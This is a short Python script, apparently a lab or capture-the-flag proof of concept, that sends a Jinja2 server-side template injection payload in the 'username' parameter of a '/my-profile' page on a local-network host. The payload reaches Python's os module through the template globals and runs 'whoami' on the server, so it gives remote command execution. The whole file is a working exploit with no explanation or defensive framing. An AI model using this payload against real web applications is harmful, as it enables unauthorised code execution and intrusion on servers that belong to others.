import requests

url = "http://192.168.1.164:4100/my-profile"

payloads = "{{cycler.__init__.__globals__.os.popen('whoami').read()}}"
data = {"username": payloads}

response = requests.get(url, params=data)

print(response.text)
